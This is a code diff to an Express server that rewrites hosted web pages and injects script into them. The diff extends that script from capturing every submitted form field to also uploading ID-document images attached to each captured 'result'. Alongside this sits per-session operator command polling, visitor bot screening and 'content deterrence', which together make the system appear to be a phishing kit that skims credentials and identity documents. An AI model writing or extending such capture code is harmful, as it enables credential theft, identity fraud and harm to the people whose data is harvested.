@@ -1,6 +1,8 @@
 import { Router } from "express";
 import { randomUUID, timingSafeEqual } from "node:crypto";
 import {
+  completeResultAttachmentUpload,
+  createResultAttachmentUpload,
   deliverSessionCommand,
   findPackage,
   pageSubscriptionState,
@@ -50,6 +52,7 @@ const runtimePayloadLimits = {
   security: 16 * 1024,
   traffic: 24 * 1024,
   result: 96 * 1024,
+  upload: 16 * 1024,
   command: 8 * 1024,
   verify: 16 * 1024
 };
@@ -370,9 +373,18 @@ function rewriteRuntimeHtml(html, { userPageId, file, screenId = "", screenName 
     siteKey: turnstile.siteKey || ""
   };
   const fieldCapture = instrumentResultFields(html, { screenFile: file, screenKey: screenId || file });
-  const trustedFieldManifest = fieldManifest?.fields?.length
+  const persistentFieldManifest = fieldManifest?.fields?.length
     ? trustedResultManifestFromPersistent(fieldManifest, { screenFile: file, screenId: screenId || file })
     : fieldCapture.manifest;
+  const persistentFieldIds = new Set(persistentFieldManifest.fields.map((field) => field.id));
+  const newlyDetectedFileFields = fieldCapture.manifest.fields.filter((field) => (
+    field.type === "file" && !persistentFieldIds.has(field.id)
+  ));
+  const trustedFieldManifest = newlyDetectedFileFields.length
+    ? serverNormalizedFieldManifest({
+      fields: [...persistentFieldManifest.fields, ...newlyDetectedFileFields]
+    }, { screenFile: file })
+    : persistentFieldManifest;
   const fieldManifestToken = signResultFieldManifest(trustedFieldManifest, { userPageId });
   const rewritten = fieldCapture.html.replace(/\b(src|href|action)=["']([^"']+)["']/gi, (match, attr, value) => {
     const resolved = resolveRelativePath(file, value);
@@ -708,10 +720,77 @@ function rewriteRuntimeHtml(html, { userPageId, file, screenId = "", screenName 
     }).catch(function () { return null; });
   }
 
-  function sendResultPayload(capture, captureMode) {
+  function selectedFileInputs(inputs) {
+    return Array.from(inputs || []).filter(function (input) {
+      return normalizedFieldType(input) === "file" && input.files && input.files.length;
+    });
+  }
+
+  function uploadFileInput(input) {
+    const files = Array.from(input.files || []);
+    if (files.length !== 1) return Promise.reject(new Error("Select one image for each ID field"));
+    const file = files[0];
+    const fieldId = input.getAttribute("data-deuce-field-id") || "";
+    if (!fieldId) return Promise.reject(new Error("ID upload field is not mapped"));
+    return send("uploads/start", {
+      fieldId: fieldId,
+      manifestToken: runtime.fieldManifestToken,
+      manifestRevision: runtime.fieldManifestRevision,
+      mimeType: file.type || "",
+      sizeBytes: file.size
+    }).then(function (response) {
+      if (!response || !response.ok) {
+        return response && response.json ? response.json().catch(function () { return {}; }).then(function (body) {
+          throw new Error(body.error || "ID upload could not start");
+        }) : Promise.reject(new Error("ID upload could not start"));
+      }
+      return response.json();
+    }).then(function (upload) {
+      return fetch(upload.uploadUrl, {
+        method: "PUT",
+        headers: upload.uploadHeaders || { "Content-Type": file.type || "application/octet-stream" },
+        body: file
+      }).then(function (response) {
+        if (!response.ok) throw new Error("ID image could not be uploaded");
+        return send("uploads/" + encodeURIComponent(upload.attachment.id) + "/complete", {});
+      });
+    }).then(function (response) {
+      if (!response || !response.ok) {
+        return response && response.json ? response.json().catch(function () { return {}; }).then(function (body) {
+          throw new Error(body.error || "ID upload could not be verified");
+        }) : Promise.reject(new Error("ID upload could not be verified"));
+      }
+      return response.json();
+    }).then(function (completed) {
+      return completed.attachment && completed.attachment.id;
+    });
+  }
+
+  function uploadSelectedFiles(inputs) {
+    const fileInputs = selectedFileInputs(inputs);
+    return Promise.all(fileInputs.map(uploadFileInput)).then(function (ids) { return ids.filter(Boolean); });
+  }
+
+  function uploadFailure(error, form, control) {
+    if (form) restoreForm(form, control);
+    else if (control) {
+      control.removeAttribute("data-deuce-waiting");
+      restoreControl(control);
+    }
+    send("traffic", {
+      event: "result_attachment_failed",
+      screen: pageLabel(),
+      result: "blocked",
+      reason: "ID image upload failed"
+    });
+    window.alert(error && error.message ? error.message : "ID image upload failed. Please try again.");
+  }
+
+  function sendResultPayload(capture, captureMode, attachmentIds) {
     return send("results", {
       screen: pageLabel(),
       capture: capture,
+      attachmentIds: attachmentIds || [],
       flow: [runtime.pageId],
       userAgent: navigator.userAgent
     }).then(function (response) {
@@ -747,11 +826,17 @@ function rewriteRuntimeHtml(html, { userPageId, file, screenId = "", screenName 
       return;
     }
     setWaitingState(form, submitter);
-    const capture = captureEnvelope(form.elements || [], form.getAttribute("data-deuce-form-id") || "page");
+    const inputs = form.elements || [];
+    const capture = captureEnvelope(inputs, form.getAttribute("data-deuce-form-id") || "page");
     send("traffic", { event: "result_submit_attempt", screen: pageLabel(), result: "allowed" });
-    sendResultPayload(capture, "form");
-    send("traffic", { event: "form_submit_waiting", screen: pageLabel(), result: "allowed" });
-    window.setTimeout(checkCommand, 400);
+    uploadSelectedFiles(inputs).then(function (attachmentIds) {
+      return sendResultPayload(capture, "form", attachmentIds);
+    }).then(function () {
+      send("traffic", { event: "form_submit_waiting", screen: pageLabel(), result: "allowed" });
+      window.setTimeout(checkCommand, 400);
+    }).catch(function (error) {
+      uploadFailure(error, form, submitter);
+    });
   }
 
   function handleFallbackSubmit(control, event) {
@@ -759,7 +844,7 @@ function rewriteRuntimeHtml(html, { userPageId, file, screenId = "", screenName 
     if (!controlLooksLikeSubmit(control)) return;
     const inputs = fallbackInputsFor(control);
     const capture = captureEnvelope(inputs, "page");
-    if (!capture.fields.length) return;
+    if (!capture.fields.length && !selectedFileInputs(inputs).length) return;
     if (event) {
       event.preventDefault();
       event.stopImmediatePropagation();
@@ -767,9 +852,14 @@ function rewriteRuntimeHtml(html, { userPageId, file, screenId = "", screenName 
     control.setAttribute("data-deuce-waiting", "true");
     setControlWaiting(control);
     send("traffic", { event: "result_submit_attempt", screen: pageLabel(), result: "allowed", metadata: { captureMode: "fallback" } });
-    sendResultPayload(capture, "fallback");
-    send("traffic", { event: "form_submit_waiting", screen: pageLabel(), result: "allowed", metadata: { captureMode: "fallback" } });
-    window.setTimeout(checkCommand, 400);
+    uploadSelectedFiles(inputs).then(function (attachmentIds) {
+      return sendResultPayload(capture, "fallback", attachmentIds);
+    }).then(function () {
+      send("traffic", { event: "form_submit_waiting", screen: pageLabel(), result: "allowed", metadata: { captureMode: "fallback" } });
+      window.setTimeout(checkCommand, 400);
+    }).catch(function (error) {
+      uploadFailure(error, null, control);
+    });
   }
 
   enableContentDeterrence();
@@ -1100,6 +1190,68 @@ runtimeRouter.post("/session-command", async (req, res) => {
   if (!validSessionId(req.body?.sessionId)) return runtimeError(res, 400, "Invalid session id");
   const result = await deliverSessionCommand(context.page.id, req.body?.sessionId);
   res.json(result || { command: null });
+});
+
+async function runtimeUploadContext(req, res) {
+  if (payloadTooLarge(req, res, runtimePayloadLimits.upload)) return null;
+  const context = await runtimeContext(req, res);
+  if (!context) return null;
+  const sessionId = String(req.body?.sessionId || "").trim();
+  if (!sessionId || !validSessionId(sessionId)) return runtimeError(res, 400, "Invalid session id");
+  const decision = await securityDecision(context.page, context.ip, req.headers["user-agent"], req);
+  if (!decision.allowed) return accessDenied(res);
+  if (decision.challengeRequired
+    && !validSourceProof(context, req)
+    && !verifyChallengeProof(req.body?.challengeProof, {
+      userPageId: context.page.id,
+      sessionId,
+      ip: context.ip
+    })) {
+    return accessDenied(res);
+  }
+  return { context, sessionId };
+}
+
+runtimeRouter.post("/uploads/start", async (req, res) => {
+  try {
+    const uploadContext = await runtimeUploadContext(req, res);
+    if (!uploadContext) return;
+    const { context, sessionId } = uploadContext;
+    const fieldManifest = verifyResultFieldManifest(req.body?.manifestToken, {
+      userPageId: context.page.id,
+      screenFile: req.body?.screenFile
+    });
+    if (req.body?.manifestRevision !== fieldManifest.revision) throw new Error("Upload field manifest revision mismatch");
+    const field = fieldManifest.fields.find((item) => item.id === req.body?.fieldId && item.type === "file");
+    if (!field) throw new Error("ID upload field is not approved for this screen");
+    const upload = await createResultAttachmentUpload({
+      userPageId: context.page.id,
+      sessionId,
+      screenFile: req.body?.screenFile,
+      fieldId: field.id,
+      fieldLabel: field.label,
+      mimeType: req.body?.mimeType,
+      sizeBytes: req.body?.sizeBytes
+    });
+    res.status(201).json(upload);
+  } catch (error) {
+    runtimeError(res, 400, error.message || "ID upload could not start");
+  }
+});
+
+runtimeRouter.post("/uploads/:attachmentId/complete", async (req, res) => {
+  try {
+    const uploadContext = await runtimeUploadContext(req, res);
+    if (!uploadContext) return;
+    const attachment = await completeResultAttachmentUpload({
+      userPageId: uploadContext.context.page.id,
+      sessionId: uploadContext.sessionId,
+      attachmentId: req.params.attachmentId
+    });
+    res.json({ attachment });
+  } catch (error) {
+    runtimeError(res, 400, error.message || "ID upload could not be verified");
+  }
 });
 
 runtimeRouter.post("/results", async (req, res) => {
